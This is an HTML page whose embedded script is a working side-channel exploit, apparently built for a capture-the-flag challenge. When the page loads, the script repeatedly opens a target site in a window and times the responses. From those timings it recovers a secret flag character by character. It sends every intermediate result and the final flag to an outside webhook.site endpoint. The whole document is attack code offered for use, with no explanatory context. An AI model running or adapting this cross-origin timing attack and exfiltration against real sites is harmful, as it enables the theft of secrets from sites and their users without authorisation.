<!DOCTYPE html><html><head><meta charset="utf-8"></head><body><script>
// v9 - verified sequential oracle, fresh start
var T="https://svfgp.breakable.live";
var W="https://webhook.site/bfddf06d-fc1d-4615-b9e2-1842fa04aede";
var known="CTF{";
var HEX="0123456789abcdef";

function exfil(d){
  fetch(W+"?d="+encodeURIComponent(d)+"&t="+Date.now(),{mode:"no-cors",cache:"no-store"}).catch(function(){});
}

exfil("v9_LOADED");

function probeOne(q){
  return new Promise(function(res){
    var sid="s"+Math.random().toString(36).slice(2,10);
    var rid="r"+Math.random().toString(36).slice(2,10);
    var url=T+"/?mode=probe&q="+encodeURIComponent(q)+
      "&sid="+encodeURIComponent(sid)+"&rid="+encodeURIComponent(rid);
    var t0=performance.now();
    var w;
    try{w=window.open(url,"pw");}catch(e){res(-1);return;}
    if(!w){res(-1);return;}
    var done=false;
    function fin(ms){if(done)return;done=true;try{w.close();}catch(e){}res(Math.round(ms));}
    function handler(e){
      if(e.data&&e.data.type==="svfgp-probe-done"&&e.data.sid===sid){
        window.removeEventListener("message",handler);
        fin(performance.now()-t0);
      }
    }
    window.addEventListener("message",handler);
    setTimeout(function(){window.removeEventListener("message",handler);fin(-1);},3500);
  });
}

function shuffle(a){for(var i=a.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=a[i];a[i]=a[j];a[j]=t;}return a;}

// Measure baseline: probe a non-matching prefix to get typical fast time
async function getBaseline(){
  var times=[];
  for(var i=0;i<3;i++){
    var t=await probeOne("ZZZZZZ"+Math.random());
    if(t>0)times.push(t);
  }
  if(times.length===0)return 180;
  times.sort(function(a,b){return a-b;});
  return times[Math.floor(times.length/2)]; // median
}

// Verify prefix is correct (should trigger PBKDF2, return > baseline+150)
async function verifyPrefix(prefix,baseline){
  var t=await probeOne(prefix);
  return {ok:t > baseline+150, t:t};
}

async function findChar(prefix,pos,baseline){
  // Warmup
  await probeOne("ZZZZ");
  
  // Test all 16 hex chars in random order, collect times
  var chars=shuffle(HEX.split(""));
  var results=[];
  for(var i=0;i<chars.length;i++){
    var ch=chars[i];
    var t=await probeOne(prefix+ch);
    results.push({c:ch,t:t});
    // Early exit: if clearly above baseline+200ms, likely our match
    if(t > baseline+200){
      // Verify by probing again
      var t2=await probeOne(prefix+ch);
      if(t2 > baseline+150){
        exfil("HIT_P"+pos+":"+ch+"="+t+"ms,v="+t2+"ms(bl="+baseline+")");
        return ch;
      }
    }
  }
  
  // No early exit — pick top and verify
  results.sort(function(a,b){return b.t-a.t;});
  var top=results[0], second=results[1];
  var gap=top.t-second.t;
  var info=results.slice(0,4).map(function(x){return x.c+"="+x.t;}).join(",");
  exfil("P"+pos+":"+info+"|gap="+gap+"|bl="+baseline);
  
  if(gap>80){
    // Verify the top char
    var vt=await probeOne(prefix+top.c);
    if(vt > baseline+150){
      exfil("VER_P"+pos+":"+top.c+"="+vt+"ms_OK");
      return top.c;
    }
  }
  
  // No clear winner - report and stop (don't guess)
  exfil("STUCK_P"+pos+":no_clear_winner");
  return null;
}

async function run(){
  exfil("v9_START:"+known);
  var t0=Date.now();
  
  // Get baseline
  var baseline=await getBaseline();
  exfil("BASELINE:"+baseline+"ms");
  
  // Verify our starting prefix is valid
  var v=await verifyPrefix(known,baseline);
  exfil("VERIFY_PREFIX:"+v.t+"ms(ok="+v.ok+")");
  if(!v.ok){
    exfil("BAD_PREFIX:"+known);
    return;
  }

  while(known.length < 4+64){
    if(Date.now()-t0>53000){exfil("TIME:"+known);break;}
    var pos=known.length-4;
    var ch=await findChar(known,pos,baseline);
    if(!ch){
      exfil("ABORT:"+known);
      break;
    }
    known+=ch;
    exfil("F:"+known);
    
    // Verify new prefix is still valid (PBKDF2 should still trigger)
    var vr=await verifyPrefix(known,baseline);
    if(!vr.ok){
      // Last char was wrong! Remove it and try again
      exfil("WRONG_CHAR:"+known+"(vt="+vr.t+"ms),backtrack");
      known=known.slice(0,-1);
      // Try the position again with more careful measurement
      var ch2=await findChar(known,pos,baseline);
      if(ch2 && ch2!==ch){
        known+=ch2;
        exfil("FIX:"+known);
      } else {
        exfil("CANT_FIX:"+known);
        break;
      }
    }
  }

  if(known.length===4+64)known+="}";
  exfil("DONE:"+known);
}

setTimeout(run,200);
</script></body></html>
